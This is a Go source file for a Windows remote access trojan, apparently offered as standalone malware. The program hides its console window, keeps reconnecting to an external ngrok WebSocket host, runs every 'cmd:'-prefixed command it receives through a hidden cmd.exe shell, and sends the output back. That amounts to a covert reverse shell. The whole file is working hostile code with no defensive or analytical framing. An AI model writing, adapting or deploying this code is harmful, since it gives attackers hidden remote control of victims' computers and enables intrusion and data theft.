package main

import (
    "encoding/json"
    "log"
    "os"
    "os/exec"
    "strings"
    "syscall"
    "time"
    "unsafe"

    "github.com/gorilla/websocket"
)

type Message struct {
    Type    string `json:"type"`
    Message string `json:"message"`
}

var (
    kernel32        = syscall.NewLazyDLL("kernel32.dll")
    user32          = syscall.NewLazyDLL("user32.dll")
    getConsoleWindow = kernel32.NewProc("GetConsoleWindow")
    showWindow      = user32.NewProc("ShowWindow")
)

func hideConsole() {
    hwnd, _, _ := getConsoleWindow.Call()
    if hwnd != 0 {
        showWindow.Call(hwnd, 0) // SW_HIDE = 0
    }
}

func executeCommand(command string) string {
    cmd := exec.Command("cmd", "/c", command)
    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
    
    output, err := cmd.CombinedOutput()
    if err != nil {
        return "Error: " + err.Error()
    }
    
    result := string(output)
    if result == "" {
        return "Command executed (no output)"
    }
    return result
}

func main() {
    hideConsole()
    
    serverURL := "ws://0.tcp.ngrok.io:12354"
    
    for {
        conn, _, err := websocket.DefaultDialer.Dial(serverURL, nil)
        if err != nil {
            time.Sleep(5 * time.Second)
            continue
        }
        
        for {
            var msg Message
            err := conn.ReadJSON(&msg)
            if err != nil {
                break
            }
            
            if msg.Type == "message" && strings.HasPrefix(msg.Message, "cmd:") {
                command := strings.TrimSpace(msg.Message[4:])
                if len(command) > 0 && len(command) < 1000 {
                    output := executeCommand(command)
                    
                    response := Message{
                        Type:    "message",
                        Message: "[" + command + "]\n" + output,
                    }
                    
                    conn.WriteJSON(response)
                }
            }
        }
        
        conn.Close()
        time.Sleep(5 * time.Second)
    }
}